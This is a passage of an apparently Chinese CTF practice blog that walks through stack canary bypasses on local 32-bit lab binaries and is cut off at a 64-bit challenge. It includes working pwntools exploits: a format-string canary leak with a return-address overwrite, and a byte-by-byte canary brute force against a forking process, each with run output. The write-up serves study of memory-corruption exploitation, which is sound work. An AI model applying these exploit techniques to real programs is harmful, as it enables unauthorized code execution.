如何寻找变量和ebp之间的偏移</h2><p>先分析一下源代码</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># gdb bin</span><br>pwndbg&gt; <span class="hljs-keyword">b </span>main<br><span class="hljs-keyword">Breakpoint </span><span class="hljs-number">1</span> <span class="hljs-built_in">at</span> <span class="hljs-number">0x8048739</span><br>pwndbg&gt; r<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904221703.png" alt="image.png"></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x804873c</span> &lt;main+<span class="hljs-number">17</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">gs</span>:[<span class="hljs-number">0x14</span>]<br><span class="hljs-number">0x8048742</span> &lt;main+<span class="hljs-number">23</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span> - <span class="hljs-number">0xc</span>], <span class="hljs-built_in">eax</span><br></code></pre></td></tr></table></figure><p>这两行就是和canary相关的汇编代码</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">pwndbg&gt; <span class="hljs-built_in">n</span><br></code></pre></td></tr></table></figure><p>运行完 <code>0x804873c &lt;main+17&gt;    mov    eax, dword ptr gs:[0x14]</code>之后，eax中存入的即为canary的值，为0x888b8f00 (注意，每次运行canary的值都会变)，如下图</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904221849.png" alt="image.png"></p><p>运行完<code>0x8048742 &lt;main+23&gt;    mov    dword ptr [ebp - 0xc], eax</code>，canary的值被存入到<code>ebp-0xc</code>的位置，如下图</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904222140.png" alt="image.png"></p><p>为了方便查看，把伪代码再粘贴一份过来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> format[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [esp+6h] [ebp-12h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  init();<br>  __isoc99_scanf(<span class="hljs-string">&quot;%6s&quot;</span>, format);<br>  <span class="hljs-built_in">printf</span>(format);<br>  fun();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>__isoc99_scanf(&quot;%6s&quot;, format);</code>  scanf函数有两个参数，我们知道，函数压栈的时候，是从右向左压栈的。</p><p>如下图红框1，可以看到在调用scanf之前，push了两个值，第一个eax([ebp-0x12])是format的地址，第二个0x8048838是”%6s”，所以format在ebp-0x12的位置。EBP位于0xffffd368，所以format在0xffffd356的位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">└─<span class="hljs-comment"># python</span><br>Python <span class="hljs-number">3.11</span><span class="hljs-number">.4</span> (main, Jun  <span class="hljs-number">7</span> <span class="hljs-number">2023</span>, <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:09) [GCC <span class="hljs-number">12.2</span><span class="hljs-number">.0</span>] on linux<br><span class="hljs-type">Type</span> <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">0xffffd368</span> - <span class="hljs-number">0x12</span><br><span class="hljs-number">4294955862</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(<span class="hljs-number">4294955862</span>)<br><span class="hljs-string">&#x27;0xffffd356&#x27;</span><br></code></pre></td></tr></table></figure><p>另一种方法，如下图红框2，运行完main+39和main+40之后，栈中最近的两个变量即为scanf的两个参数，所以format在0xffffd356的位置。</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904222955.png" alt="image.png"></p><p>继续运行，输入%p%p%p(因为只能接收6个字符)，直到输出printf</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos">pwndbg&gt; n<br><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><br>pwndbg&gt; n<br></code></pre></td></tr></table></figure><p>如下图，最上面输出的3个地址，即为printf格式化字符串漏洞泄露的3个地址，从上往下数，canary位于第7个位置。</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904224257.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904224357.png" alt="image.png"></p><p>再次验证一下<br>退出gdb调试，重新进入，这次输入%7$p</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904224603.png" alt="image.png"></p><p>可以看到，输出的地址和canary的地址是一样的<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904224636.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904224700.png" alt="image.png"></p><p>为了方便查看，我把fun的代码再粘贴一份</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+8h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x78</span>u);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样的方式，查找buf变量到ebp的距离，如下图，可以看到buf为<code>ebp-70h</code>的位置</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">pwndbg&gt; b <span class="hljs-function"><span class="hljs-keyword">fun</span></span><br>Breakpoint <span class="hljs-number">1</span> at <span class="hljs-number">0x80486f9</span><br>pwndbg&gt; r<br>Starting program: /root/ctf-practice/canary/<span class="hljs-number">01</span>/bin<br>[Thread debugging using libthread_db enabled]<br>Using host libthread_db library <span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.<br>%<span class="hljs-number">7</span>$p<br><span class="hljs-number">0x9585b900</span><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904225226.png" alt="image.png"></p><p>main和fun函数canary到ebp的偏移都是一样的，所以我们从fun函数进行溢出</p><h2 id="栈帧分析"><a href="#栈帧分析" class="headerlink" title="栈帧分析"></a>栈帧分析</h2><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">默认栈帧<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     retaddr     </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     saved ebp   </span>|<br>                                    ebp---&gt;+-----------------+-----------------<br>                                           |<span class="hljs-string">                 </span>|<br>                                0xc        |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">     canary      </span>|<br>                              ebp-0xc ---&gt; +-----------------+<br>                                           |<span class="hljs-string">                 </span>|<span class="hljs-string">     0x70</span><br><span class="hljs-string">                                           </span>|<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<span class="hljs-string">    </span><br><span class="hljs-string">                                           </span>|<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                           ebp-0x70 buf---&gt;+-----------------+-----------------<br><br>修改后栈帧<br>                                           +-----------------+<br>                                           |<span class="hljs-string"> (retaddr) 后门  </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string"> (saved ebp)BBBB </span>|<br>                                    ebp---&gt;+-----------------+-----------------<br>                                           |<span class="hljs-string">      BBBB       </span>|<br>                                0xc        |<span class="hljs-string">      BBBB       </span>|<br>                                           |<span class="hljs-string">     canary      </span>|<br>                              ebp-0xc ---&gt; +-----------------+<br>                                           |<span class="hljs-string">                 </span>|<span class="hljs-string">     0x70</span><br><span class="hljs-string">                                           </span>|<span class="hljs-string">      AAAA       </span>|<br>                                           |<span class="hljs-string">                 </span>|<span class="hljs-string">    </span><br><span class="hljs-string">                                           </span>|<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                           ebp-0x70 buf---&gt;+-----------------+-----------------                               <br></code></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>,<span class="hljs-string">&#x27;-x&#x27;</span>,<span class="hljs-string">&#x27;bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<span class="hljs-comment">#arch也可以是i386~看文件</span><br><br><br>p = process(<span class="hljs-string">&#x27;./bin&#x27;</span>)<br><br>payload = <span class="hljs-string">&#x27;%7$p&#x27;</span>  <span class="hljs-comment"># 可以</span><br><span class="hljs-comment"># payload = &#x27;%7$x&#x27; # 可以</span><br>p.sendline(payload)<br>canary = <span class="hljs-built_in">int</span>(p.recv(),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary: &quot;</span>, canary) <span class="hljs-comment"># p.recv()应该返回一个十六进制字符串，然后通过int()函数将其转换为整数，并将结果存储在canary变量中。</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(canary): &quot;</span>, <span class="hljs-built_in">hex</span>(canary))<br>getflag = <span class="hljs-number">0x0804863B</span><br><span class="hljs-comment"># payload = b&#x27;a&#x27;*100 + p32(canary) + b&#x27;a&#x27;*12 + p32(getflag) # 可以</span><br><span class="hljs-comment"># payload = b&#x27;a&#x27;*(0x70-0x0c) + p32(canary) + b&#x27;b&#x27;* 0xc + p32(getflag) # 可以</span><br>payload = cyclic(<span class="hljs-number">0x70</span>-<span class="hljs-number">0x0c</span>) + p32(canary) + cyclic(<span class="hljs-number">0xc</span>) + p32(getflag) <span class="hljs-comment"># 可以</span><br><br>p.send(payload)<br>p.interactive()<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">┌──(root㉿kali)-[~/ctf-practice/canary/01]</span><br><span class="hljs-string">└─# python exp.py</span><br><span class="hljs-string">[+] Starting local process &#x27;./bin&#x27;: pid 174011</span><br><span class="hljs-string">/root/ctf-practice/canary/01/exp.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  p.sendline(payload)</span><br><span class="hljs-string">canary:  4237685760</span><br><span class="hljs-string">hex(canary):  0xfc95f400</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">flag123</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/4657#toc-6">canary的各种姿势—-pwn题解版</a>  题目1</p><h1 id="02-针对fork的进程-32位程序"><a href="#02-针对fork的进程-32位程序" class="headerlink" title="02 针对fork的进程 (32位程序)"></a>02 针对fork的进程 (32位程序)</h1><h2 id="checksec分析"><a href="#checksec分析" class="headerlink" title="checksec分析"></a>checksec分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/ctf-practice/canary/02]<br>└─<span class="hljs-comment"># checksec --file=bin1</span><br>[*] <span class="hljs-string">&#x27;/root/ctf-practice/canary/02/bin1&#x27;</span><br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br><br>┌──(root㉿kali)-[~/ctf-practice/canary/02]<br>└─<span class="hljs-comment"># file bin1</span><br>bin1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=29de21cdd9a0496a8057313502c90562b715014b, not stripped<br><br>┌──(root㉿kali)-[~/ctf-practice/canary/02]<br>└─<span class="hljs-comment"># ./bin1</span><br>welcome<br>123456<br>recv sucess<br>welcome<br>qweasdzxc<br>recv sucess<br>welcome<br><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905112939.png" alt="image.png"></p><h2 id="分析漏洞函数-1"><a href="#分析漏洞函数-1" class="headerlink" title="分析漏洞函数"></a>分析漏洞函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">__pid_t</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  init();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v3 = fork();<br>    <span class="hljs-keyword">if</span> ( v3 &lt; <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( v3 )<br>    &#123;<br>      wait(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;welcome&quot;</span>);<br>      fun();<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;recv sucess&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fork error&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+8h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x78</span>u);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getflag</span><span class="hljs-params">()</span><br>&#123;<br>  FILE *stream; <span class="hljs-comment">// [esp+4h] [ebp-74h]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+8h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  stream = fopen(<span class="hljs-string">&quot;./flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !stream )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;get flag error&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  fgets(s, <span class="hljs-number">100</span>, stream);<br>  <span class="hljs-built_in">puts</span>(s);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary值也一样。那我们就可以逐位爆破，如果程序GG了就说明这一位不对，如果程序正常就可以接着跑下一位，直到跑出正确的canary。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>,<span class="hljs-string">&#x27;-x&#x27;</span>,<span class="hljs-string">&#x27;bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<span class="hljs-comment">#arch也可以是i386~看文件</span><br><br>p = process(<span class="hljs-string">&#x27;./bin1&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;welcome\n&#x27;</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        txt = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">100</span> + canary + <span class="hljs-built_in">bytes</span>([i])<br>        <span class="hljs-comment"># print(&quot;txt: &quot;, txt)</span><br>        p.send(txt)<br>        a = p.recvuntil(<span class="hljs-string">&quot;welcome\n&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;recv&quot;</span> <span class="hljs-keyword">in</span> a:<br>            canary += <span class="hljs-built_in">bytes</span>([i])<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary: &quot;</span>, canary)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;type(canary): &quot;</span>, <span class="hljs-built_in">type</span>(canary))<br>getflag = <span class="hljs-number">0x0804863B</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;getflag: &quot;</span>, getflag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p32(getflag): &quot;</span>, p32(getflag))<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">100</span> + canary + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">12</span> + p32(getflag)<br>p.sendline(payload)<br>p.interactive()<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">└─# python exp.py</span><br><span class="hljs-string">[+] Starting local process &#x27;./bin1&#x27;: pid 248869</span><br><span class="hljs-string">/root/ctf-practice/canary/02/exp.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  p.recvuntil(&#x27;welcome\n&#x27;)</span><br><span class="hljs-string">/root/ctf-practice/canary/02/exp.py:17: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  a = p.recvuntil(&quot;welcome\n&quot;)</span><br><span class="hljs-string">canary:  b&#x27;\x00?&#x27;</span><br><span class="hljs-string">canary:  b&#x27;\x00?\xb2&#x27;</span><br><span class="hljs-string">canary:  b&#x27;\x00?\xb2a&#x27;</span><br><span class="hljs-string">type(canary):  &lt;class &#x27;bytes&#x27;&gt;</span><br><span class="hljs-string">getflag:  134514235</span><br><span class="hljs-string">p32(getflag):  b&#x27;;\x86\x04\x08&#x27;</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">flag123</span><br><span class="hljs-string"></span><br><span class="hljs-string">welcome</span><br><span class="hljs-string">recv sucess</span><br><span class="hljs-string">welcome</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>debug模式下的输出：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905112639.png" alt="image.png"></p><p>当输入<code>00 a6</code>的时候，输出<code>stack smashing detected</code><br>当输入<code>00 a7</code>的时候，输出<code>recv sucess</code></p><p>普通执行输出：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905113121.png" alt="image.png"></p><p>和上一题一样，同一个目录下放了一个flag文件<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905113230.png" alt="image.png"></p><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/4657#toc-6">canary的各种姿势—-pwn题解版</a>  题目2</p><h1 id="03-64位"><a href="#03-64位" class="headerlink" title="03 (64位)"></a>03 (64位)</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/ctf-practice/canary/03]<br>└─<span class="hljs-comment"># checksec --file=babypie</span><br>[*] <span class="hljs-string">&#x27;/root/ctf-practice/canary/03/babypie&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br><br>┌──(root㉿kali)-[~/ctf-practice/canary/03]<br>└─<span class="hljs-comment"># file babypie</span><br>babypie: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=77a11dbd367716f44ca03a81e8253e14b6758ac3, stripped<br><br><br></code></pre></td></tr></table></figure><h2 id="分析漏洞函数-2"><a href="#分析漏洞函数-2" class="headerlink" title="分析漏洞函数"></a>分析漏洞函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title 